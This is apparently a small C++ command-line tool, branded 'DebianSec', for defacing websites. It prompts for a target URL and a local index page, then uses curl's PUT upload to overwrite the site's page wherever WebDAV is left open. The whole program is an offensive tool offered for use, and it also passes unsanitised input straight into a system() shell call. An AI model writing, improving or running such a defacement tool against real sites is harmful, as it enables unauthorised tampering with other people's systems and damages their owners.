#include <iostream>
#include <string>
#include <Windows.h>

using namespace std;
namespace Color
{
    enum Code
    {
        FG_RED = 31,
        FG_GREEN = 32,
        FG_BLUE = 34,
        FG_DEFAULT = 39,
        BG_RED = 41,
        BG_GREEN = 42,
        BG_BLUE = 44,
        BG_DEFAULT = 49
    };
    class Modifier
    {
        Code code;

    public:
        Modifier(Code pCode) : code(pCode) {}
        friend std::ostream &
        operator<<(std::ostream &os, const Modifier &mod)
        {
            return os << "\033[" << mod.code << "m";
        }
    };
}

void clear()
{

    system("cls || clear");
}

void banner()
{

    cout << "\033[93m######                                 #####                " << endl;
    cout << "#     # ###### #####  #   ##   #    # #     # ######  ####  " << endl;
    cout << "#     # #      #    # #  #  #  ##   # #       #      #    # " << endl;
    cout << "#     # #####  #####  # #    # # #  #  #####  #####  #      " << endl;
    cout << "#     # #      #    # # ###### #  # #       # #      #      " << endl;
    cout << "#     # #      #    # # #    # #   ## #     # #      #    # " << endl;
    cout << "######  ###### #####  # #    # #    #  #####  ######  ####  " << endl;
    
}

int main()
{
    clear();
    banner();

    Color::Modifier BLUE(Color::FG_BLUE);
    Color::Modifier RED(Color::FG_RED);
    cout << BLUE << endl;
    cout << RED << "\n                  NOTE: Only websites with WebDav Vulnerability can be defaced!" << BLUE << endl;

    string web;
    cout << "\n\nEnter Website to deface : ";
    cin >> web;

    char web_back = web.back();

    if (web.find("http") == string::npos)
    {

        clear();
        cout << RED << "Wrong URl, Please provide a valid URL\n\n Example: https://example.com/\n\n"
             << endl;
    }

    else if (web_back != '/')
    {

        clear();
        cout << RED << "Wrong URl, You forgot to add '/' in the end\n\n Example: https://example.com/\n\n"
             << endl;
    }

    else
    {

        string pth;
        cout << BLUE << "Enter Your Index : ";
        cin >> pth;
        if (pth == "")
        {
            clear();
            cout << RED << "Index File Not Found!" << endl;
        }
        else
        {

            cout << RED << endl;
            system(("curl -T " + pth + " " + web + " || cls && echo Curl not found!, Please Download Curl && PAUSE && exit || clear && echo Curl not found!, Please Download Curl && PAUSE && exit ").c_str());
            cout << BLUE << "\nDone!" << endl;
        }
    }

    system("PAUSE");

    return 0;
}